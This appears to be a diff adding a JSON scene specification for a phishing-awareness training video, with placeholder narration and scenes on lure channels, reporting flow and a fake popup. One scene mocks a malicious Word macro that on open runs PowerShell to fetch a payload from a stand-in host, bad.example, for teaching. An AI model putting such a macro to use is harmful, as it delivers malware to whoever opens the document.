@@ -1,0 +1,853 @@
+{
+ "schema_version": "1.0",
+ "course_id": "security-basics",
+ "lesson_id": "M2L1",
+ "title": "Template gallery",
+ "language": "en-GB",
+ "aspect": "16:9",
+ "formats": [
+  "explainer"
+ ],
+ "voices": {
+  "narrator": {
+   "provider": "placeholder",
+   "voice": "alloy"
+  }
+ },
+ "broll_shots": [
+  {
+   "id": "office",
+   "query": "office workers laptops",
+   "provider": "pexels",
+   "path": "media/missing-office.mp4"
+  }
+ ],
+ "generated_images": [
+  {
+   "id": "desk",
+   "prompt": "flat vector desk with laptop, no text, no letters, no numbers, no signage, no logos"
+  }
+ ],
+ "scenes": [
+  {
+   "id": "sec",
+   "template": "section",
+   "props": {
+    "n": 2,
+    "title": "Inside the attack",
+    "sub": "How a phishing campaign unfolds",
+    "icon": "target"
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "grid",
+   "template": "icon_grid",
+   "props": {
+    "title": "Where phishing arrives",
+    "items": [
+     {
+      "icon": "mail",
+      "label": "Email"
+     },
+     {
+      "icon": "smartphone",
+      "label": "SMS",
+      "sub": "Smishing"
+     },
+     {
+      "icon": "phone",
+      "label": "Phone call",
+      "sub": "Vishing"
+     },
+     {
+      "icon": "message",
+      "label": "Chat apps"
+     },
+     {
+      "icon": "globe",
+      "label": "Fake websites",
+      "tone": "warn"
+     },
+     {
+      "icon": "users",
+      "label": "Social media"
+     }
+    ],
+    "cols": 3
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "flow",
+   "template": "process_flow",
+   "props": {
+    "title": "Reporting flow",
+    "nodes": [
+     {
+      "id": "a",
+      "label": "Email arrives",
+      "kind": "start"
+     },
+     {
+      "id": "b",
+      "label": "Suspicious?",
+      "kind": "decision"
+     },
+     {
+      "id": "c",
+      "label": "Report it"
+     },
+     {
+      "id": "d",
+      "label": "Carry on"
+     },
+     {
+      "id": "e",
+      "label": "Security reviews",
+      "kind": "end"
+     }
+    ],
+    "edges": [
+     {
+      "from": "a",
+      "to": "b"
+     },
+     {
+      "from": "b",
+      "to": "c",
+      "label": "yes"
+     },
+     {
+      "from": "b",
+      "to": "d",
+      "label": "no"
+     },
+     {
+      "from": "c",
+      "to": "e"
+     }
+    ]
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "tl",
+   "template": "timeline",
+   "props": {
+    "title": "Anatomy of a breach",
+    "events": [
+     {
+      "when": "09:02",
+      "label": "Email sent"
+     },
+     {
+      "when": "09:15",
+      "label": "Link clicked"
+     },
+     {
+      "when": "09:16",
+      "label": "Password captured",
+      "sub": "Fake login page"
+     },
+     {
+      "when": "11:40",
+      "label": "Mailbox accessed"
+     }
+    ]
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "cmp",
+   "template": "comparison",
+   "props": {
+    "title": "Real vs fake",
+    "left": {
+     "head": "Real IT email",
+     "items": [
+      "Uses your name",
+      "Links to northwind.example",
+      "No deadline"
+     ]
+    },
+    "right": {
+     "head": "Phishing email",
+     "items": [
+      "Generic greeting",
+      "Lookalike domain",
+      "2-hour deadline"
+     ]
+    }
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "st",
+   "template": "stat",
+   "props": {
+    "value": 91,
+    "suffix": "%",
+    "label": "of attacks start with an email",
+    "source": "Illustrative figure",
+    "icon": "mail"
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "stm",
+   "template": "statement",
+   "props": {
+    "text": "Attackers don't hack computers, they hack people.",
+    "accent": "hack people",
+    "sub": "Your judgement is the last line of defence"
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "br",
+   "template": "broll",
+   "props": {
+    "shot": "office",
+    "chips": [
+     "Busy inbox",
+     "Monday morning"
+    ]
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "brp",
+   "template": "broll_panel",
+   "props": {
+    "shot": "office",
+    "title": "Why it works",
+    "items": [
+     {
+      "text": "We are busy"
+     },
+     {
+      "text": "We trust brands"
+     },
+     {
+      "text": "We fear missing out",
+      "tone": "warn"
+     }
+    ],
+    "side": "right"
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "img",
+   "template": "image",
+   "props": {
+    "image": "desk",
+    "caption": "A tidy desk hides nothing.",
+    "chips": [
+     "Clean desk"
+    ]
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "mfa",
+   "template": "mfa_prompt",
+   "props": {
+    "app": "Northwind Authenticator",
+    "place": "Sign-in from an unknown location",
+    "count_to": 5,
+    "caption": "Five prompts in a minute? Deny and report."
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "pop",
+   "template": "popup",
+   "props": {
+    "title": "Your computer is infected!",
+    "body": "Call this number now to unlock your files.",
+    "cta": "Call support",
+    "tone": "bad"
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "code",
+   "template": "code_mock",
+   "props": {
+    "title": "A malicious macro",
+    "filename": "invoice.docm",
+    "lines": [
+     "Sub AutoOpen()",
+     "  Dim url As String",
+     "  url = \"http://bad.example/payload\"",
+     "  Shell \"powershell -c iwr \" & url",
+     "End Sub"
+    ],
+    "highlight": [
+     {
+      "cue": 0,
+      "line": 1,
+      "label": "Runs on open",
+      "tone": "warn"
+     },
+     {
+      "cue": 1,
+      "line": 4,
+      "label": "Downloads malware",
+      "tone": "warn"
+     }
+    ]
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "scast",
+   "template": "screencast",
+   "props": {
+    "app": {
+     "kind": "form",
+     "title": "Report phishing",
+     "fields": [
+      {
+       "id": "subj",
+       "label": "Email subject",
+       "kind": "text"
+      },
+      {
+       "id": "cat",
+       "label": "Category",
+       "kind": "select"
+      },
+      {
+       "id": "clicked",
+       "label": "I clicked a link",
+       "kind": "checkbox"
+      },
+      {
+       "id": "send",
+       "label": "Submit report",
+       "kind": "button"
+      }
+     ]
+    },
+    "actions": [
+     {
+      "cue": 0,
+      "do": "type",
+      "target": "subj",
+      "value": "Password expires in 2 hours",
+      "label": "Paste the subject"
+     },
+     {
+      "cue": 1,
+      "do": "select",
+      "target": "cat",
+      "value": "Credential phishing",
+      "label": "Pick the category"
+     },
+     {
+      "cue": 2,
+      "do": "click",
+      "target": "clicked",
+      "label": "Tick if you clicked"
+     },
+     {
+      "cue": 3,
+      "do": "click",
+      "target": "send",
+      "label": "Submit"
+     },
+     {
+      "cue": 4,
+      "do": "toast",
+      "label": "Report sent to Security"
+     }
+    ]
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "scast_assess",
+   "template": "screencast",
+   "props": {
+    "app": {
+     "kind": "form",
+     "title": "Report phishing",
+     "fields": [
+      {
+       "id": "subj",
+       "label": "Email subject",
+       "kind": "text"
+      },
+      {
+       "id": "cat",
+       "label": "Category",
+       "kind": "select"
+      },
+      {
+       "id": "clicked",
+       "label": "I clicked a link",
+       "kind": "checkbox"
+      },
+      {
+       "id": "send",
+       "label": "Submit report",
+       "kind": "button"
+      }
+     ]
+    },
+    "actions": [
+     {
+      "cue": 0,
+      "do": "type",
+      "target": "subj",
+      "value": "Password expires in 2 hours",
+      "label": "Paste the subject"
+     },
+     {
+      "cue": 1,
+      "do": "select",
+      "target": "cat",
+      "value": "Credential phishing",
+      "label": "Pick the category"
+     },
+     {
+      "cue": 2,
+      "do": "click",
+      "target": "clicked",
+      "label": "Tick if you clicked"
+     },
+     {
+      "cue": 3,
+      "do": "click",
+      "target": "send",
+      "label": "Submit"
+     },
+     {
+      "cue": 4,
+      "do": "toast",
+      "label": "Report sent to Security"
+     }
+    ],
+    "sim": {
+     "mode": "assess",
+     "task": "Report the phishing email you received",
+     "expect": [
+      {
+       "target": "subj",
+       "value": "*"
+      },
+      {
+       "target": "cat",
+       "value": "Credential phishing"
+      },
+      {
+       "target": "send"
+      }
+     ],
+     "max_attempts": 2,
+     "on_fail": "continue"
+    }
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "cart",
+   "template": "cartoon",
+   "props": {
+    "set": "office",
+    "desk": true,
+    "people": [
+     {
+      "cast": "rookie",
+      "x": 0.3,
+      "pose": "phone",
+      "expr": "worried"
+     },
+     {
+      "cast": "mentor",
+      "x": 0.7,
+      "pose": "point",
+      "expr": "happy",
+      "flip": true
+     }
+    ],
+    "bubbles": [
+     {
+      "cue": 0,
+      "who": "rookie",
+      "text": "This email says my account is locked!"
+     },
+     {
+      "cue": 1,
+      "who": "mentor",
+      "text": "Check the sender first. Let's report it."
+     }
+    ]
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "wb",
+   "template": "whiteboard",
+   "props": {
+    "title": "How a lure works",
+    "items": [
+     {
+      "cue": 0,
+      "kind": "person",
+      "cast": "vex",
+      "pose": "rub",
+      "expr": "sly",
+      "x": 0.15,
+      "y": 0.55
+     },
+     {
+      "cue": 1,
+      "kind": "arrow",
+      "x": 0.25,
+      "y": 0.5,
+      "to": {
+       "x": 0.42,
+       "y": 0.5
+      },
+      "color": "attention"
+     },
+     {
+      "cue": 1,
+      "kind": "icon",
+      "icon": "mail",
+      "text": "Bait email",
+      "x": 0.5,
+      "y": 0.5
+     },
+     {
+      "cue": 2,
+      "kind": "arrow",
+      "x": 0.58,
+      "y": 0.5,
+      "to": {
+       "x": 0.75,
+       "y": 0.5
+      }
+     },
+     {
+      "cue": 2,
+      "kind": "person",
+      "cast": "learner",
+      "pose": "think",
+      "x": 0.85,
+      "y": 0.55
+     },
+     {
+      "cue": 3,
+      "kind": "note",
+      "text": "Pause!",
+      "x": 0.5,
+      "y": 0.2,
+      "color": "attention"
+     },
+     {
+      "cue": 3,
+      "kind": "circle",
+      "x": 0.5,
+      "y": 0.2,
+      "w": 0.18,
+      "h": 0.2,
+      "color": "attention"
+     },
+     {
+      "cue": 4,
+      "kind": "check",
+      "x": 0.85,
+      "y": 0.18,
+      "color": "safe"
+     }
+    ]
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "comic",
+   "template": "comic",
+   "props": {
+    "layout": "3",
+    "panels": [
+     {
+      "set": "home",
+      "people": [
+       {
+        "cast": "learner",
+        "pose": "phone",
+        "expr": "neutral"
+       }
+      ],
+      "caption": "Friday night, a text arrives.",
+      "bubbles": [
+       {
+        "who": "learner",
+        "text": "A parcel fee? I didn't order anything."
+       }
+      ]
+     },
+     {
+      "set": "home",
+      "people": [
+       {
+        "cast": "learner",
+        "pose": "think",
+        "expr": "think"
+       }
+      ],
+      "bubbles": [
+       {
+        "who": "learner",
+        "text": "The link looks odd...",
+        "think": true
+       }
+      ],
+      "sfx_word": "Hmm"
+     },
+     {
+      "set": "office",
+      "people": [
+       {
+        "cast": "learner",
+        "pose": "cheer",
+        "expr": "happy"
+       },
+       {
+        "cast": "support",
+        "pose": "wave",
+        "expr": "happy"
+       }
+      ],
+      "caption": "Monday: reported and blocked."
+     }
+    ]
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  },
+  {
+   "id": "fc",
+   "template": "flashcard",
+   "props": {
+    "front": "Smishing",
+    "back": "Phishing by SMS text message.",
+    "icon": "smartphone"
+   },
+   "narration": [
+    {
+     "who": "host",
+     "text": "Narration for this scene ^with a cue."
+    }
+   ],
+   "claims": [
+    {
+     "text": "Illustrative example.",
+     "general_knowledge": true
+    }
+   ]
+  }
+ ]
+}
